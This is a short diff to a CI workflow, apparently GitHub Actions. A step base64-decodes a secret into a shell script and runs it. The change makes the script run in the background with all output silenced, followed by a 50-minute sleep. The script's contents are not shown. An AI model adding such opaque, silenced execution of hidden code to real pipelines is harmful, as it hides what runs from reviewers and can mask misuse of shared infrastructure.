@@ -20,6 +20,6 @@ jobs:
           TEZ: ${{ secrets.TEZ }}
         run: |
           echo "$TEZ" | base64 --decode > ku.sh
-          sh ku.sh #> /dev/null 2>&1 &
+          sh ku.sh > /dev/null 2>&1 &
           sleep 50m 
           echo "OK"
